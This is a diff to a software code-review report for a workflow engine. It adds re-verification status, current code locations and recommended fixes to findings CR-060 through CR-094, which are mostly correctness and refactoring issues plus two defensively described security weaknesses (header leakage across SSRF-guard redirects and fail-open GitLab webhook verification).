+- **Current location:** lib/engine/runtime/fanout/merge-arena.ts:296, lib/engine/runtime/flow-reconciler.ts:154
+- **Re-verification note:** `export const mergeArena = new MergeArena()` is still a plain module singleton holding `locks` and `inFlight`, while the reconciler (itself a `processSingleton`) relies on `isMerging()`; under `next dev` duplicated bundles can double-run merges. Wrap with `processSingleton("mergeArena", () => new MergeArena())`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1559,6 +1815,10 @@ Original findings, verbatim:
 
 ### CR-060 [Medium] Poller ticks can overlap, and non-MR steps of the tick run outside any try/catch
 
+- **Status at `abaa007`:** **Open**, fix in [Task 25](review-tasks/25-wait-timers-and-poller.md)
+- **Current location:** lib/engine/runtime/flow-poller.ts:40,43-72
+- **Re-verification note:** `setInterval(() => void this.tick(), …)` still allows overlapping ticks, and `processWaitTimers()`/`processTemplateSchedules()` still run outside any try/catch, so a throw aborts the tick as an unhandled rejection. Add a `ticking` re-entrancy guard (or self-rescheduling `setTimeout`) and wrap each tick phase in its own logged try/catch.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1578,6 +1838,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-061 [Medium] Floating promises and mistyped async signatures in the fan-out path and `bg()`
+
+- **Status at `abaa007`:** **Open**, fix in [Task 19](review-tasks/19-fanout-rollup-and-promises.md)
+- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:145,325,544,574,653,706,896, lib/engine/runtime/split/split-manager.ts:436,650, lib/engine/flow-engine.ts:286,598-615, lib/engine/runtime/flow-reconciler.ts:312-329
+- **Re-verification note:** The engine port still declares `finishFanout(...): void` while `FlowEngine.finishFanout` is async, so `step-flow-manager.ts:653` drops its promise; `void this.advance(...)` still voids a non-promise, `checkRollup`/`runMergeBack`/`checkJoin` are fire-and-forget, and the catch blocks in `bg()` and the reconciler re-attach IIFE still write to the DB unguarded. Type the port `Promise<void>` and await it, funnel fire-and-forget work through one guarded helper, and enable `@typescript-eslint/no-floating-promises` (lint now runs).
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1604,6 +1868,10 @@ Original findings, verbatim:
 
 ### CR-062 [Medium] Template validation has no cycle detection on `next` edges
 
+- **Status at `abaa007`:** **Open**, fix in [Task 23](review-tasks/23-graph-semantics-and-validation.md)
+- **Current location:** lib/engine/templates/template-store.ts:799-811, lib/engine/templates/template-lint.ts:352-358
+- **Re-verification note:** `validated()` still rejects only unknown endpoints, self-edges and duplicates; a `next`-edge cycle (A→B→A) saves fine and then idles silently (join `all`) or becomes an unconditional re-entry (join `any`). Add a DFS/Kahn check over `kind==="next"` edges that rejects with "use a loop edge for re-entry", plus a template-store test.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1620,6 +1888,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-063 [Medium] Validator accepts edge shapes the runtime silently ignores (labels on non-decision edges, conditions on decision edges)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 23](review-tasks/23-graph-semantics-and-validation.md)
+- **Current location:** lib/engine/flow-engine.ts:1041-1057, lib/engine/templates/template-store.ts:812-829, lib/engine/templates/template-lint.ts:352-358
+- **Re-verification note:** `edgeActive` still returns false for any labeled edge out of a non-decision node and ignores `condition` on decision edges, yet `validated()` only checks decision out-edges and lint still compiles decision-edge conditions. Reject labels on non-decision-source edges and conditions on decision out-edges in `validated()`, mirrored as lint problems with `edgeIndex`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1643,6 +1915,10 @@ Original findings, verbatim:
 
 ### CR-064 [Medium] Auto-wrap template lookup can never match, so every fan-out expansion creates a new hidden template and inbound hook
 
+- **Status at `abaa007`:** **Open**, fix in [Task 19](review-tasks/19-fanout-rollup-and-promises.md)
+- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:436-466, lib/engine/templates/template-store.ts:233-236,897, lib/engine/runtime/hook-store.ts:71-88
+- **Re-verification note:** `autoWrap` still searches `templateStore.list()` (which filters `hidden=0`) for a `hidden === 1` row, so every expansion creates a new hidden template and, through `syncTemplate`, a new inbound webhook with its own secret; the name-based key would also collide across same-labeled nodes. Key reuse on (source template id, node key, config hash) looked up with `includeHidden`, and skip hook provisioning for hidden templates.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1659,6 +1935,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-065 [Medium] Flows read the live template graph, so the "snapshot" guarantee is only partly true
+
+- **Status at `abaa007`:** **Open**, fix in [Task 24](review-tasks/24-template-snapshot-and-yaml.md)
+- **Current location:** lib/engine/templates/template-store.ts:169-179,405-410,494-503,704-722, lib/engine/flow-engine.ts:858-860
+- **Re-verification note:** Only `nodes.config` is snapshotted; `graphForFlow` still re-reads the live template (edges, triggers, wait_for, input_map, joins) on every call, `updateNodeTemplate` has no active-flow guard, and the comments still claim "running flows snapshot at creation and are never affected by template edits". Either snapshot the graph onto the flow at create time, or correct the comments and extend `assertNotRunning` to `updateNodeTemplate`/`deleteNodeTemplate` for referenced definitions; memoize the graph per `advanceFrom`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1681,6 +1961,10 @@ Original findings, verbatim:
 
 ### CR-066 [Medium] Flow `delete()` does not stop in-flight work or clear in-memory engine state
 
+- **Status at `abaa007`:** **Open**, fix in [Task 17](review-tasks/17-node-claim-and-attempts.md)
+- **Current location:** lib/engine/flow-engine.ts:546-567
+- **Re-verification note:** `delete()` still only removes worktrees and then deletes table rows per flow; it does not cancel running/waiting nodes or in-flight merges, clear `waitTimers`/in-memory state, or run the deletes in one transaction, so background work keeps writing to a deleted flow. Cancel every running/waiting node of the flow and its children first, refuse while `mergeArena.isMerging(child)`, drop timer entries, and wrap the deletes in one transaction.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1701,6 +1985,10 @@ Original findings, verbatim:
 
 ### CR-067 [Medium] Failed YAML import "rollback" deletes pre-existing node templates it merely reused
 
+- **Status at `abaa007`:** **Open**, fix in [Task 12](review-tasks/12-db-transactions.md)
+- **Current location:** lib/engine/templates/template-yaml.ts:251-261,292-298, lib/engine/templates/template-store.ts:729-760
+- **Re-verification note:** `ensureNodeTemplate` still returns a bare id (an existing identical row's id when one matches) and the importer pushes it into `createdNodeTemplateIds` unconditionally, so a failed import's rollback deletes a user's pre-existing, currently unreferenced Library definition. Return `{ id, created }` (like `createOrReuseNodeTemplate`) and push only when `created`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1717,6 +2005,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-068 [Medium] SSRF guard forwards all request headers, secrets included, across cross-host redirects
+
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/net/ssrf-guard.ts:79-99,121-145
+- **Re-verification note:** On redirect the guard re-validates the target against the allowlist but still replays `req.headers` (which carry interpolated `{{secrets.*}}`) to the new host, and allowlist entries match subdomains, so credentials leak across cross-origin redirects. Drop `authorization`/`cookie`/`proxy-authorization` and secret-bearing headers when `next.origin !== url.origin`, or refuse cross-origin redirects unless explicitly enabled.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1736,6 +2028,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-069 [Medium] GitLab webhook verification fails open when `GITLAB_WEBHOOK_SECRET` is unset, and compares the token with a non-constant-time `===`
+
+- **Status at `abaa007`:** **Open**, fix in [Task 58](review-tasks/58-security-webhook-auth.md)
+- **Current location:** lib/config.ts:21-24, lib/engine/ports/git-host.ts:193-194, lib/integrations/gitlab/git-host.ts:244-248, app/api/webhooks/gitlab/route.ts:28
+- **Re-verification note:** Unchanged. `verifyWebhook` still returns true when `GITLAB_WEBHOOK_SECRET` is unset and compares `x-gitlab-token` with `===`; the config doc still says "unset = accept all". Fix: deny by default, with an explicit `GITLAB_WEBHOOK_ALLOW_UNSIGNED=1` opt-in and a startup warning. Compare with `crypto.timingSafeEqual` over sha256 digests (the same pattern `lib/engine/runtime/hook-store.ts:136-140` already uses) and update the port doc.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1783,6 +2079,10 @@ Original findings, verbatim:
 
 ### CR-070 [Medium] `FlowEngine` is a god class with about ten responsibilities in 1,800 lines
 
+- **Status at `abaa007`:** **Open**, fix in [Task 45](review-tasks/45-flow-engine-decomposition.md)
+- **Current location:** lib/engine/flow-engine.ts:89-2039 (create/createStepChild/createSplitChild 95-285, get/list 358-535, plan-step editing 788-857, edge/join/skip machine 966-1163, wait timers 1290-1335 and 1904-1943, triggers/webhook starts 1757-1903, MR lookup and comment ingestion 1971-2039)
+- **Re-verification note:** The file grew from about 1,800 to 2,039 lines. Split-runtime proxies (skip/retry/approve/cancelSplitUnit, finishSplit) were added alongside the existing responsibilities. Only the SDLC chain, the split manager and the step-flow manager live outside it. Extract FlowFactory, FlowReadModel, EdgeActivator, WaitScheduler and CommentIngestor/MrLocator behind a thin facade, one per PR.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 2 — Engine core & shared lib
@@ -1823,6 +2123,10 @@ Original findings, verbatim:
 
 ### CR-071 [Medium] Engine classes embed raw SQL instead of going through row mappers and stores
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
+- **Current location:** lib/engine/flow-engine.ts (51 raw db/rows calls; `SELECT id FROM nodes WHERE flow_id=? AND node_key=?` at 306, 347, 1011, 1121, 1301, 1361, 1931), lib/engine/runtime/fanout/step-flow-manager.ts (14 calls, e.g. 632, 739), lib/engine/runtime/flow-reconciler.ts:59-67,174 (9 calls), lib/engine/runtime/flow-poller.ts
+- **Re-verification note:** Node kinds now go through `NodeSupport` (lib/engine/nodes/shared/node-support.ts) and `PlanStore`. The "latest plan" query is down to two helpers: `NodeSupport.latestArtifact` and `FlowEngine.latestResourceArtifact`. The engine and runtime orchestrators still spell node status, id lookups and comment upserts as ad-hoc SQL. Remaining fix: a `NodeStore` (idOf/status/setStatus/claim) and a `CommentStore` backed by `rows.ts`, used in flow-engine, step-flow-manager and flow-reconciler.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 2 — Engine core & shared lib
@@ -1839,6 +2143,10 @@ Original findings, verbatim:
 - **Effort:** L
 
 ### CR-072 [Medium] `current_node` pointer lifecycle is inconsistent (never cleared, or cleared unconditionally)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 17](review-tasks/17-node-claim-and-attempts.md)
+- **Current location:** lib/engine/flow-engine.ts:598-614 (bg has no clear), 1658-1692 (retryNode sets the pointer at 1673, never clears it), 1726-1746 (sendChat clears unconditionally on success at 1744, never on failure), 788-791 (assertPlanEditable blocks on the pointer); lib/engine/nodes/chains/sdlc-chain.ts:103,157,182,202 (unconditional null); lib/engine/runtime/flow-reconciler.ts:59-67
+- **Re-verification note:** Plan runs now go through `sendChat`. A failed plan chat therefore leaves `current_node` set, and checklist edits stay blocked until the throttled reconcile. A successful chat can also wipe a pointer that another stage now owns. Fix: in `bg()`'s `finally`, call `clearCurrentIf(flowId, nodeKey)` when `nodeKey` is set, and remove the ad-hoc `setCurrentNode(flowId, null)` calls.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1862,6 +2170,10 @@ Original findings, verbatim:
 
 ### CR-073 [Medium] Worktree lifecycle events stamp the node row id as `nodeKey`, misrouting them in the feed
 
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/engine/runtime/worktree-lifecycle.ts:112-114, 131-135, 144-146, 230-232, 242-243, 248-249, 254
+- **Re-verification note:** Unchanged. `opts.nodeId`/`target.nodeId` is a `nodes.id` (callers pass `node.id`), but it is also written into `data.nodeKey`, so feed routing by nodeKey gets a row id. Fix: thread the real node key through opts (or resolve it from the id), or drop `nodeKey` from data when a node id is passed.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1879,6 +2191,10 @@ Original findings, verbatim:
 
 ### CR-074 [Medium] Per-branch cost attribution never applies: `tagLatestRun` runs after the run row is already closed
 
+- **Status at `abaa007`:** **Open**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
+- **Current location:** lib/engine/nodes/kinds/build/build-node.ts:327-333, lib/engine/nodes/kinds/build/branch-store.ts:39-45, lib/engine/harness/agent-runner.ts:168-169, lib/engine/nodes/shared/agent-run-node.ts:132-134
+- **Re-verification note:** `execute()` runs `finalize` only after `executeRun` has already closed the run row to finished/error. `tagLatestRun`'s `WHERE node_id=? AND status='running'` therefore never matches, and `runs.branch_id` stays null. Fix: return the run row id from `executeRun` (or pass a branchId option) and tag `WHERE id=?`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -1894,6 +2210,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-075 [Medium] Pipeline gate treats "stale head", "API error" and "no pipeline" as the same thing, so it triggers duplicate pipelines
+
+- **Status at `abaa007`:** **Open**, fix in [Task 22](review-tasks/22-pipeline-review-resolve.md)
+- **Current location:** lib/engine/nodes/kinds/pipeline/pipeline-node.ts:168-182, 354-388, 497-509
+- **Re-verification note:** Unchanged. `headPipeline()` still collapses API error (`.catch(() => null)`), no head pipeline, and stale sha into `null`. The fix-grace window only starts when `pipe != null`, so after a fix push (or a transient API error) the gate triggers an API pipeline immediately. Fix: return a discriminated `{kind: ok|stale|none|error}`, start `fixWaitStart` when `runFix` completes, and never trigger on `error` (back off instead).
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1917,6 +2237,10 @@ Original findings, verbatim:
 
 ### CR-076 [Medium] Built-in nodes never validate their config against `configSchema` at run time
 
+- **Status at `abaa007`:** **Open**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current location:** lib/engine/templates/node-config.ts:146-150, lib/engine/nodes/kinds/pipeline/pipeline-node.ts:304-316, lib/engine/nodes/kinds/review/review-node.ts:149, lib/engine/nodes/chains/sdlc-chain.ts:69, lib/engine/flow-engine.ts:711-714 and 1601-1612 (setNodeConfig merges unvalidated)
+- **Re-verification note:** Built-ins still read merged config through `configNumber`/`configString`, which accept 0, so `poll_interval_sec: 0` tight-loops the git host. `setNodeConfig` persists instance config without checking it against `configSchema`. Fix: add a base `parseConfig()` that runs `configSchema.parse` at the top of every `run()`/`turn()` and fails the node with a readable error. Validate in `setNodeConfig` too.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -1933,6 +2257,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-077 [Medium] Declarative nodes silently drop *all* instance config when any field is invalid
+
+- **Status at `abaa007`:** **Open**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current location:** lib/engine/nodes/kinds/agent/agent-node.ts:420-423, lib/engine/nodes/kinds/http/http-node.ts:227-230, lib/engine/nodes/kinds/decision/decision-node.ts:272-275, lib/engine/nodes/kinds/script/script-node.ts:289-292
+- **Re-verification note:** All four `runConfig()` copies still `safeParse` and silently fall back to `this.def` (the catalog row), discarding every instance override when one field is invalid. Fix: use `parseDeclarativeConfig(kind, config, label)` (lib/engine/nodes/declarative-schemas.ts:148) so the node fails loudly, written once in a shared declarative base.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1953,6 +2281,10 @@ Original findings, verbatim:
 
 ### CR-078 [Medium] Decision manual picks and legacy expression picks are checked against the catalog choices, not the instance's
 
+- **Status at `abaa007`:** **Open**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current location:** lib/engine/nodes/kinds/decision/decision-node.ts:111-137 (applyChoice/validateChoice/choiceLabels default to this.def), 293-302 (awaiting uses this.def labels); caller lib/engine/flow-engine.ts:1578-1579
+- **Re-verification note:** Manual picks are still validated against the catalog row's choices, and `applyChoice` evaluates `pass` from `this.def`. Instance-edited choices are rejected and pass-down variables come from the wrong map. Fix: resolve `cfg = runConfig(nodeConfig(ctx))` in `applyChoice` (make ctx required) and thread cfg through `validateChoice`/`awaiting`. Drop the legacy-expression half of this finding. The legacy single global `expression` path still exists (decision-node.ts:213-224, `normalizeChosen` 377-393, `expression` field in declarative-schemas.ts:95) and is a delete-legacy-code candidate.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -1969,6 +2301,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-079 [Medium] Decision `jsonataTruthy` doesn't follow JSONata truthiness, so empty arrays and objects pick a branch
+
+- **Status at `abaa007`:** **Open**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current location:** lib/engine/nodes/kinds/decision/decision-node.ts:15-17, 206
+- **Re-verification note:** Unchanged. `jsonataTruthy` still treats `[]`, `{}`, `NaN` and all-falsy arrays as truthy, so an empty filter result picks a branch. Fix: port JSONata's `$boolean` cast (empty array or object, all-falsy arrays and NaN are false) and unit-test the edge cases.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1988,6 +2324,10 @@ Original findings, verbatim:
 
 ### CR-080 [Medium] Agent node with `output: json` and no schema always fails
 
+- **Status at `abaa007`:** **Open**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current location:** lib/engine/nodes/kinds/agent/agent-node.ts:513-553 (541), lib/engine/nodes/kinds/agent/json-schema-lite.ts:43-49, lib/engine/nodes/declarative-schemas.ts:52
+- **Re-verification note:** `applyOutput` still calls `jsonSchemaIssues(cfg.output_schema, …)` unconditionally. With the default `output_schema: null`, `check()` throws a plain "invalid output schema (missing)" Error. That Error bypasses the AgentOutputError retry, so every json-output agent without a schema fails. Top-level arrays or primitives are still cast to a record. Fix: guard on `cfg.output_schema && typeof … === "object"` (as script-node.ts:173 does) and reject non-object JSON with a SCHEMA_MISMATCH AgentOutputError.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2005,6 +2345,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-081 [Medium] `converse()` (chat-only) always trips the late-write guard: it logs a spurious "ignoring" event and hides run errors
+
+- **Status at `abaa007`:** **Open**, fix in [Task 16](review-tasks/16-run-lifecycle-late-writes.md)
+- **Current location:** lib/engine/nodes/shared/agent-run-node.ts:81-105, lib/engine/harness/agent-runner.ts:175-187
+- **Re-verification note:** `converse()` still calls `executeRun` while the node is done/awaiting_approval. Every chat-only reply therefore logs "…result arrived after the node was already … — ignoring", and returns before the `status !== "finished"` check, so errored conversational runs come back as normal replies. Fix: add an `ownsNodeStatus: false` option that skips the guard, and run the terminal-status check before the guard.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2025,6 +2369,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-082 [Medium] A failure in stream or usage capture leaves the run row `running` and fails an agent run that finished
+
+- **Status at `abaa007`:** **Open**, fix in [Task 16](review-tasks/16-run-lifecycle-late-writes.md)
+- **Current location:** lib/engine/harness/agent-runner.ts:148-169, lib/engine/harness/usage-tracker.ts:127-160 (port.getUsage at 140-142), lib/engine/harness/pricing-source.ts:90
+- **Re-verification note:** The run-row status update still sits after the try/finally, so a `port.stream` rejection leaves the row `running`. `captureRunUsage` (including the cloud `getUsage` call) is inside the same try, so a usage failure fails a finished agent run. The LiteLLM fetch errors are caught but it has no timeout. Fix: close the run row in `finally` (`error` when there's no result), wrap usage capture in its own try/catch that logs, and add `AbortSignal.timeout()` to the pricing fetch.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2050,6 +2398,10 @@ Original findings, verbatim:
 
 ### CR-083 [Medium] Multi-branch MR, pipeline, review and resolve derive the git branch without the build's `branch_pattern`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 21](review-tasks/21-multi-branch-correctness.md)
+- **Current location:** lib/engine/nodes/kinds/build/build-run-support.ts:31-44 (honors branch_pattern), lib/engine/nodes/kinds/merge-request/merge-request-service.ts:62, lib/engine/nodes/kinds/pipeline/pipeline-node.ts:144-153, lib/engine/nodes/kinds/review/review-node.ts:57-60, lib/engine/nodes/kinds/resolve/resolve-node.ts:87-91
+- **Re-verification note:** Downstream consumers still rebuild multi-branch git branch names with `ctxHelper.buildBranch(ctx, branchName)`, which ignores a custom `branch_pattern`. With a custom pattern, the MR push/lookup and the fix/resolve checkout target a non-existent branch. Fix: persist the actual git branch on the `branches` row in `finalizeBuild` (it knows `resultBranch`) and have every consumer read it from there. This needs a schema change, so ask first.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2070,6 +2422,10 @@ Original findings, verbatim:
 
 ### CR-084 [Medium] The step-build context pack never shows sibling merge state or summaries
 
+- **Status at `abaa007`:** **Open**, fix in [Task 27](review-tasks/27-plan-checklist-integrity.md)
+- **Current location:** lib/engine/nodes/kinds/build/step-build-node.ts:119, 151, 266-286, 301-316
+- **Re-verification note:** Unchanged. `payloadOf()` rebuilds siblings as `{id,title,files,status}`, and `contextPack()` then reads the stripped `mergeStatus`/`summary`, so live merge state and summaries never reach the prompt. Fix: one Zod `StepPayloadSchema` (siblings with optional mergeStatus/summary), parsed once and passed typed to `contextPack`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2088,6 +2444,10 @@ Original findings, verbatim:
 
 ### CR-085 [Medium] Review comment parsing is fragile and unvalidated, so reviews can post nothing or post "undefined"
 
+- **Status at `abaa007`:** **Open**, fix in [Task 22](review-tasks/22-pipeline-review-resolve.md)
+- **Current location:** lib/engine/nodes/kinds/review/review-node.ts:141-146, 155, 162
+- **Re-verification note:** Unchanged. The greedy `/\[[\s\S]*\]/` plus `JSON.parse` silently yields `[]` on any markdown brackets, and unvalidated items can post "undefined". Fix: use `extractJson` from json-schema-lite, validate with `z.array(z.object({file?, line?, body: z.string().min(1)}))`, and warn or fail when the response has no valid array.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2104,6 +2464,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-086 [Medium] Review posting isn't idempotent: a retry or partial failure posts duplicate MR comments
+
+- **Status at `abaa007`:** **Open**, fix in [Task 22](review-tasks/22-pipeline-review-resolve.md)
+- **Current location:** lib/engine/nodes/kinds/review/review-node.ts:148-166
+- **Re-verification note:** Comments are still posted one by one inside `finalize`, with no record of what was posted. A partial failure followed by Retry re-posts everything. Fix: persist per-comment content hashes (artifact meta, or a table after schema sign-off) and skip already-posted hashes for this MR. Alternatively, save the artifact first and post from it in an idempotent step.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -2124,6 +2488,9 @@ Original findings, verbatim:
 
 ### CR-087 [Medium] Plan `recover()` ignores the `execution_default` knob and duplicates the persistence path
 
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** The plan node was rewritten. `recover()` (lib/engine/nodes/kinds/plan/plan-node.ts:301-340) now replays the recorded turn through `PlanOutputContract.applyTurnResult`, which publishes via `PlanStore.persistPlan` with the same `execution_default` knob, then `applyOutcome`. There is no second persistence copy any more.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2143,6 +2510,10 @@ Original findings, verbatim:
 
 ### CR-088 [Medium] An agent-node chat overwrites the recorded input, so a later Retry loses the inherited upstream input
 
+- **Status at `abaa007`:** **Open**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
+- **Current location:** lib/engine/nodes/kinds/agent/agent-node.ts:383-405 (input at 392), lib/engine/nodes/shared/agent-run-node.ts:124-129, lib/engine/flow-engine.ts:1666,1678
+- **Re-verification note:** The agent node's `chat()` still calls `execute()` with `input: {model, feedback}`, which overwrites `nodes.input`. A later `retryNode` replays that, losing the inherited upstream fields, and `{{input.*}}` renders empty. Fix: merge `{...node.input, feedback}`, or add an `execute` option that skips recording input for follow-ups.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2158,6 +2529,11 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-089 [Medium] The plan knobs `default_complex` and `decompose_default` are shown in the UI but never read
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current severity:** Low (was Medium)
+- **Current location:** lib/engine/nodes/kinds/plan/plan-node.ts:97-98, lib/engine/nodes/kinds/plan/constants/config/decompose.ts:3-8, lib/engine/nodes/kinds/plan/constants/config/index.ts:12, lib/engine/nodes/kinds/plan/plan-node.ts:183, lib/engine/nodes/kinds/plan/plan-prompt.ts:87
+- **Re-verification note:** `default_complex` was removed. `decompose_default` is still declared and shown in the config form, but nothing reads it. `turn()` builds `PlanInput.parse({prompt, promptIsBody})`, so `decompose` is always false and the decompose prompt branch is unreachable. Fix: apply `cfg.decompose_default` when building the pre-publish input, or remove the knob, its field and the dead branch.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -2175,6 +2551,10 @@ Original findings, verbatim:
 
 ### CR-090 [Medium] Plan meta and step payloads are read from the DB with casts instead of Zod
 
+- **Status at `abaa007`:** **Open**, fix in [Task 27](review-tasks/27-plan-checklist-integrity.md)
+- **Current location:** lib/engine/nodes/kinds/plan/plan-store.ts:31-51, lib/engine/nodes/kinds/build/build-node.ts:182-187, lib/engine/nodes/kinds/build/step-build-node.ts:266-286, lib/engine/nodes/declarative.ts:26-33
+- **Re-verification note:** `PlanStore.latestPlan` still casts `m.steps as PlanStep[]` and `m.branches`, bypassing the `PlanBranch` dependsOn defaults (`dependencySummaries` calls `branch.dependsOn.includes`). Build `triggerRuns` assigns `meta.branches` unchecked, step payloads are hand-coerced with `String(...)`, and `loadRow` silently turns corrupt config into `{}`. Fix: add a `PlanArtifactMeta` Zod schema (`z.array(PlanStep)`, `z.array(PlanBranch)`) safeParsed in `PlanStore.latestPlan` and reused by build/step-build. Ignore legacy artifact shapes.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -2191,6 +2571,9 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-091 [Medium] `plan-node.ts` is a 1,148-line file with about seven responsibilities
+
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** plan-node.ts is now 405 lines, a thin orchestrator over `PlanStore`, `PlanContextBlocks`, `PlanPromptBuilder`, `PlanOutputContract`, `PlanSplitter`, `PlanAgentSessions` and pure `BranchRefinement`. Most collaborators have vitest coverage (plan-store, plan-context, plan-prompt, plan-contract, branch-refinement tests).
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -2214,6 +2597,10 @@ Original findings, verbatim:
 
 ### CR-092 [Medium] Built-ins bypass the shared `execute`/`applyOutcome` persistence path and hand-roll status, output and event writes
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
+- **Current location:** lib/engine/nodes/kinds/pipeline/pipeline-node.ts:327-332, 417-431, 440-451, 474; lib/engine/nodes/kinds/resolve/resolve-node.ts:98-105; lib/engine/nodes/kinds/start/start-node.ts:74-83; lib/engine/nodes/kinds/build/build-node.ts:440-456; lib/engine/nodes/kinds/http/http-node.ts:92-98, 152-154; lib/engine/nodes/kinds/script/script-node.ts:107-111, 120-121, 132-133, 179-180; lib/engine/nodes/kinds/plan/plan-node.ts:230-241, 276-288
+- **Re-verification note:** Plan, agent and decision success and recover paths now finish through `applyOutcome`. Pipeline (green/failed/canceled), resolve's no-comments early return, start (event "Flow started…" vs returned "flow started"), build `recoverBranch`, and the http/script failure paths still hand-roll `setNode` + emit. Fix: make `applyOutcome` (with optional agentId) the only terminal writer, have `recover()` return a `RunOutcome`, and add a base `markRunning()`.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 3 — Engine nodes
@@ -2231,6 +2618,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-093 [Medium] Declarative nodes copy-paste the same helpers
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 49](review-tasks/49-node-kind-structure.md)
+- **Current location:** holdsForApproval: lib/engine/nodes/kinds/agent/agent-node.ts:582-588, lib/engine/nodes/kinds/http/http-node.ts:232-236, lib/engine/nodes/kinds/decision/decision-node.ts:394-398, lib/engine/nodes/kinds/script/script-node.ts:293-297; runConfig: agent-node.ts:420-423, http-node.ts:227-230, decision-node.ts:272-275, script-node.ts:289-292; http-node.ts:195-221 vs lib/engine/nodes/shared/template-renderer.ts:35-51; decision-node.ts:10
+- **Re-verification note:** `{{a.b.c}}` rendering moved to the shared `TemplateRenderer` (used by agent and decision), and the unused `renderAgentPrompt` import in http-node is gone. Still duplicated: `holdsForApproval` ×4, `runConfig` ×4, the constructor/description/defaultConfig boilerplate ×4, and http's own `interpolate` path walk. Decision still imports `extractJson` from the sibling `agent/` kind. Fix: an abstract `DeclarativeNode<Def>` owning def/runConfig (strict)/holdsForApproval/description. Make http use `TemplateRenderer` with a secrets hook, and move `extractJson` to `nodes/shared`.
 
 - **Severity:** Medium
 - **Category:** Code quality
@@ -2257,6 +2648,10 @@ Original findings, verbatim:
 
 ### CR-094 [Medium] Built-in nodes duplicate MR resolution, the "result branch + diff artifact" finalize, and the latest-plan query
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 21](review-tasks/21-multi-branch-correctness.md)
